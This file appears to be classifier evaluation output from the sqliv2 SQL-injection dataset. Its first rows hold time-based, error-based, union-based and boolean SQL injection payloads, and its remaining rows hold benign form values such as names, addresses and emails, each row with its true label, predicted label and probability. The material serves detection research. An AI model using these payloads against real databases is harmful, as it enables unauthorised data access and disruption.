text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
1'  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (  'yqbo' = 'yqbo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,32919,1,1,0.9999864101409912,1
select  ( case when  ( 7645 = 5921 )  then 7645 else 7645* ( select 7645 from information_schema.character_sets )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,32928,1,1,0.9999860525131226,1
-7369 or 9323 = 9323#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,32943,1,1,0.9999855756759644,1
"1'  )  )   )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'nlky' like 'nlky",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,379,1,1,0.9999865293502808,1
"1""  )  )   as vtad where 3653 = 3653 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,32955,1,1,0.9999865293502808,1
"-4287%""  )  )   union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,32967,1,1,0.9999861717224121,1
"1' )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( 'nlfl' like 'nlfl",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,336,1,1,0.9999864101409912,1
"1 where 1326 = 1326 union all select null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,32976,1,1,0.9999856948852539,1
"-1600%""  )  )   )  or elt ( 4568 = 7693,7693 )  and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,32982,1,1,0.9999866485595703,1
"1%'  )  )   and make_set ( 6527 = 9529,9529 )  and   (  (  '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,32988,1,1,0.9999866485595703,1
"-2434'  )  )   )  union all select 5509,5509,5509,5509,5509,5509,5509--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,32998,1,1,0.9999864101409912,1
"1"" )  where 9223 = 9223 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,359,1,1,0.9999864101409912,1
"-6249'  )  )   )  union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33010,1,1,0.9999864101409912,1
"1  )  )   or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,828,1,1,0.9999864101409912,1
"-9265"" )  or 7834 = 1685",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33020,1,1,0.9999861717224121,1
"1'  )  )   or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  'uvlu' = 'uvlu",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,379,1,1,0.9999865293502808,1
"1%' )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,336,1,1,0.9999862909317017,1
"1"" )  as cysq where 5258 = 5258",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33033,1,1,0.9999862909317017,1
1 )  where 6090 = 6090,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33043,1,1,0.9999860525131226,1
"iif ( 1095 = 2853,1,1/0 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33055,1,1,0.9999853372573853,1
"1"" )  where 2837 = 2837 and  ( 3020 = 3020 ) *6703--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33057,1,1,0.9999865293502808,1
"-1287"" )  as bbzg where 1475 = 1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33062,1,1,0.9999860525131226,1
"1"" and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,359,1,1,0.9999865293502808,1
"1'|| ( select 'osux' from dual where 7066 = 7066 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  )  ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33071,1,1,0.9999862909317017,1
"1%"" )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,359,1,1,0.9999865293502808,1
1' where 1628 = 1628,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33084,1,1,0.999985933303833,1
"1"" where 6179 = 6179",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33096,1,1,0.9999858140945435,1
1  )  )   as dqfl where 7527 = 7527,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33107,1,1,0.9999862909317017,1
"-1591 where 3291 = 3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33119,1,1,0.9999850988388062,1
1'|| ( select 'ogyu' from dual where 6691 = 6691,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33129,1,1,0.999985933303833,1
1'  )  )   as fcjk where 7755 = 7755,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33131,1,1,0.9999862909317017,1
"1%""  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1674,1,1,0.9999864101409912,1
"1'  )  )   or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,828,1,1,0.9999865293502808,1
"1"" )  where 6679 = 6679 rlike sleep ( 5 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33142,1,1,0.9999864101409912,1
"1""  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( ""sdvu"" like ""sdvu",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,359,1,1,0.9999865293502808,1
"1%""  )  )   or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,276,1,1,0.9999865293502808,1
"1"" )  where 8878 = 8878 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,336,1,1,0.9999862909317017,1
-7378' or 6872 = 6872 and 'bnmn' like 'bnmn,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33154,1,1,0.9999858140945435,1
"1%' and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,359,1,1,0.9999865293502808,1
"-4798""  )  )   )  union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33166,1,1,0.9999864101409912,1
"1""  )  )   and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  ""qycx"" like ""qycx",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,336,1,1,0.9999864101409912,1
"1%"" )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,828,1,1,0.9999860525131226,1
"1""  )  )   rlike  ( select  ( case when  ( 8179 = 1246 )  then 1 else 0x28 end  )  )   and   (  (  ""xxeu"" = ""xxeu",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33179,1,1,0.9999865293502808,1
"-7808""  )  )   as jgkk where 9230 = 9230 or elt ( 1032 = 1032,3623 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33180,1,1,0.9999864101409912,1
"1%"" )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,379,1,1,0.9999861717224121,1
"1'|| ( select 'fbtm' where 1335 = 1335 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   ) ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33193,1,1,0.9999865293502808,1
"1'|| ( select 'nfgq' where 1837 = 1837 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33207,1,1,0.999985933303833,1
"1"" )  as ranl where 5553 = 5553",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33218,1,1,0.9999862909317017,1
"1%' or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,828,1,1,0.9999853372573853,1
"1"" where 2072 = 2072 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,828,1,1,0.9999853372573853,1
1'+ ( select 'mzee' where 5984 = 5984,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33229,1,1,0.9999861717224121,1
"-4408"" )  or 6872 = 6872 and  ( ""oenu"" = ""oenu",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33239,1,1,0.9999865293502808,1
1 where 4003 = 4003 union all select null--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33240,1,1,0.9999853372573853,1
"1 where 2278 = 2278 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,336,1,1,0.9999862909317017,1
"( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3148,1,1,0.9999864101409912,1
"-3116  )  )   as jyiq where 3875 = 3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33251,1,1,0.9999862909317017,1
"-8544%"" or 6872 = 6872 and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33261,1,1,0.9999860525131226,1
"1'  )  )   and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  'tnfm' like 'tnfm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,359,1,1,0.9999866485595703,1
"1"" )  and make_set ( 4553 = 8132,8132 )  and  ( ""pfci"" like ""pfci",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33286,1,1,0.9999865293502808,1
"1' and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and 'lywy' like 'lywy",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,336,1,1,0.9999862909317017,1
1'+ ( select tafk where 9652 = 9652,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33297,1,1,0.9999860525131226,1
"1%' )  and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,854,1,1,0.9999862909317017,1
"1""  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,812,1,1,0.9999865293502808,1
1' where 2661 = 2661,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33309,1,1,0.9999860525131226,1
"-9487  )  )   as rvck where 9404 = 9404 or make_set ( 8921 = 6045,6045 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33311,1,1,0.9999861717224121,1
"1%"" or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,828,1,1,0.9999850988388062,1
"1%"" and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,336,1,1,0.9999864101409912,1
"1' and elt ( 9371 = 8882,8882 )  and 'vurh' = 'vurh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,33321,1,1,0.9999861717224121,1
0120957560122435,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35475,0,0,0.00026508670998737216,1
9448799154735544,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35485,0,0,8.559607522329316e-05,1
08182,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35495,0,0,4.534629624686204e-05,1
4358738088308536,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35498,0,0,0.00010572807514108717,1
6920006006312240,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35512,0,0,6.510213279398158e-05,1
8417338456175136,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35522,0,0,4.418578100739978e-05,1
5010003702753512,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35531,0,0,5.246882574283518e-05,1
2301580169203669,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35543,0,0,0.00026069176965393126,1
8511359548446745,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35553,0,0,7.08920561010018e-05,1
5275682756103294,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35563,0,0,4.6444354666164145e-05,1
deimos 147 12?a,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35576,0,0,4.287206320441328e-05,1
2e64n8m5,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35588,0,0,7.807305519236252e-05,1
cervera brcena,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35594,0,0,3.830545756500214e-05,1
6702564951251728,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35597,0,0,5.116554893902503e-05,1
mo3e5e5o,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35609,0,0,3.625204772106372e-05,1
tadeas4,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35622,0,0,3.6386536521604285e-05,1
97084633t,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35633,0,0,3.8445545214926824e-05,1
1ed6at0zacin,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35645,0,0,4.4126110879005864e-05,1
23628,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35654,0,0,6.124452193034813e-05,1
chiriv herrador,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35667,0,0,3.885470505338162e-05,1
belmondo@artesania.org.ci,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35678,0,0,3.6079978599445894e-05,1
patatera,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35688,0,0,4.235221422277391e-05,1
lluv8os4,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35697,0,0,3.85342282243073e-05,1
plutarco,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35699,0,0,3.650331564131193e-05,1
aristbulo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35714,0,0,3.9448303141398355e-05,1
torrelavega,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35728,0,0,3.6840439861407503e-05,1
"juan xxii 24, 3?c",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35738,0,0,4.391910624690354e-05,1
9786890057742572,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35749,0,0,3.465562986093573e-05,1
43376,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35756,0,0,4.242347495164722e-05,1
"calle orion 74,",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35761,0,0,4.459300544112921e-05,1
jetazo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35773,0,0,4.6987370296847075e-05,1
huic!h9,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35787,0,0,4.686386091634631e-05,1
lescot,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35798,0,0,4.9060599849326536e-05,1
7272917416802626,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35808,0,0,5.854188930243254e-05,1
turcot,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35812,0,0,4.4117066863691434e-05,1
calle martin arredondo 31 9g,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35821,0,0,3.705692870425992e-05,1
46157420p,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35835,0,0,6.38826095382683e-05,1
debever@viajesparamujeres.es,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35848,0,0,3.63226754416246e-05,1
dac@eonon.com.cy,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35859,0,0,4.831416663364507e-05,1
catalineta,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35865,0,0,3.925979763153009e-05,1
d0l1tativ8,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35872,0,0,9.06356071936898e-05,1
6417632466491788,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35883,0,0,9.345858416054398e-05,1
5388507530059847,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35894,0,0,3.534128700266592e-05,1
43736,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35900,0,0,4.7723864554427564e-05,1
09135,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35912,0,0,5.084554140921682e-05,1
07160844r,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35925,0,0,6.551522528752685e-05,1
hrenyk,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35927,0,0,3.765396468224935e-05,1
43558,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35939,0,0,4.066303881700151e-05,1
2820,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35952,0,0,0.00010538876813370734,1
tableo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35965,0,0,5.843079634360038e-05,1
cartagenero,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35978,0,0,3.926069621229544e-05,1
9129793967568864,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35986,0,0,6.379135447787121e-05,1
aranga,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,35992,0,0,5.5391912610502914e-05,1
4277,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36002,0,0,6.913527613505721e-05,1
moreno undurraga,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36014,0,0,4.2122264858335257e-05,1
richarde@zarahealth.bz,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36027,0,0,3.736444705282338e-05,1
8alantos4,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36038,0,0,3.753862620214932e-05,1
1112,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36049,0,0,9.14000702323392e-05,1
05315763a,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36057,0,0,4.908811388304457e-05,1
paolino amodeo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36062,0,0,3.519706297083758e-05,1
"calle enrique lopez garcia s/n,",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36077,0,0,3.709532757056877e-05,1
guize_ranson@infotek.bn,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36083,0,0,3.559251126716845e-05,1
seriano-reeggiero@distritoeste.pk,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36095,0,0,3.589541302062571e-05,1
23657,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36096,0,0,4.793527477886528e-05,1
"isla de nelson, 89 7?h",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36111,0,0,3.884021862177178e-05,1
pavan@phd-photodecor.in,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36124,0,0,4.849094693781808e-05,1
estreptoccico,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36140,0,0,4.609568713931367e-05,1
nanook@cup-id.lu,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36150,0,0,4.203935168334283e-05,1
22571,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36156,0,0,4.499668284552172e-05,1
4748,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36164,0,0,4.515202817856334e-05,1
saltigallo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36175,0,0,4.171046748524532e-05,1
greenlee,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36185,0,0,4.538171924650669e-05,1
kristiansen-fineschi@bijoubijoudiferente.cl,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36202,0,0,3.555133662302978e-05,1
34295530t,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36213,0,0,4.7967376303859055e-05,1
gretal3,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36216,0,0,3.738311352208257e-05,1
7012769883161832,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36227,0,0,6.43485618638806e-05,1
suany,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36239,0,0,8.955560042522848e-05,1
cladera,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36243,0,0,4.685501698986627e-05,1
c/ pampa 76,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36262,0,0,5.177318598725833e-05,1
00090113e,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36265,0,0,5.404473267844878e-05,1
7159,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36277,0,0,4.391650509205647e-05,1
macedonio,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36288,0,0,3.763730637729168e-05,1
"calle capita farre, 82, 8-d",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36298,0,0,4.5875895011704415e-05,1
e7tearina,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36311,0,0,3.4718483220785856e-05,1
c4e32788ia,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36322,0,0,3.968207965954207e-05,1
tegenes,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36327,0,0,4.6797671529930085e-05,1
basco,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36335,0,0,5.016347859054804e-05,1
han-chie,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36345,0,0,4.774881017510779e-05,1
marcet bolivar,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36357,0,0,3.8440488424384966e-05,1
06145837f,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36370,0,0,5.727889947593212e-05,1
c46pa,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36383,0,0,3.9761402149451897e-05,1
salaberri dvila,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36392,0,0,3.600735362851992e-05,1
66091214r,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36402,0,0,4.109924702788703e-05,1
genoveva,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36413,0,0,4.105889820493758e-05,1
48872890y,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36417,0,0,3.6915767850587144e-05,1
el*e0toral,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36430,0,0,4.466211248654872e-05,1
casas de san galindo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36440,0,0,3.782160274568014e-05,1
mylong@deltamarina.aq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36454,0,0,3.7079760659253225e-05,1
leoine,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36464,0,0,4.8053861974040046e-05,1
ferra,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36469,0,0,4.910768984700553e-05,1
49322,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36475,0,0,4.293908932595514e-05,1
maddalen,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36477,0,0,3.7949062971165404e-05,1
c/ rosario 192 2?b,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36487,0,0,4.117586649954319e-05,1
nogueira@magritte.ly,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36502,0,0,3.6817258660448715e-05,1
dina,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36512,0,0,4.6667588321724907e-05,1
"av. jose ferrandez cruz 182, 8b",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36518,0,0,3.612759610405192e-05,1
s093li8n7,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36525,0,0,5.754739686381072e-05,1
33160,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36535,0,0,4.340902523836121e-05,1
hesseman.dolen@gaudio.mu,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36549,0,0,3.7952537240926176e-05,1
20180,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36560,0,0,4.686122701968998e-05,1
8790895171234504,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36574,0,0,5.931461419095285e-05,1
